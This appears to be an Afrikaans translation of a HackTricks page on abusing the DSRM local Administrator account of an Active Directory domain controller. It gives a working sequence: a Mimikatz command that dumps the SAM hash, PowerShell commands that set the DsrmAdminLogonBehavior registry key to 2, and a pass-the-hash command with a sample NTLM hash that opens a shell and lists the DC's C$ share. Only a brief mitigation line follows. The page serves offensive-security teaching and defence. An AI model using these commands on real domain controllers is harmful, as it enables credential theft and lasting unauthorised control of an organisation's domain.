{{#include ../../banners/hacktricks-training.md}}

# DSRM Kredensiale

Daar is 'n **lokale administrateur** rekening binne elke **DC**. Met admin regte op hierdie masjien kan jy mimikatz gebruik om die **lokale Administrateur hash** te **dump**. Dan, deur 'n register te wysig om hierdie wagwoord te **aktiveer** sodat jy op afstand toegang kan verkry tot hierdie lokale Administrateur gebruiker.\
Eerstens moet ons die **hash** van die **lokale Administrateur** gebruiker binne die DC **dump**:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Dan moet ons kyk of daardie rekening sal werk, en as die register sleutel die waarde "0" het of nie bestaan nie, moet jy **dit op "2" stel**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Dan, deur 'n PTH te gebruik, kan jy **die inhoud van C$ lys of selfs 'n shell verkry**. Let daarop dat om 'n nuwe powershell-sessie met daardie hash in geheue (vir die PTH) te skep, **die "domein" wat gebruik word net die naam van die DC masjien is:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Meer inligting hieroor in: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) en [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Versagting

- Gebeurtenis ID 4657 - Oudit skepping/wijziging van `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
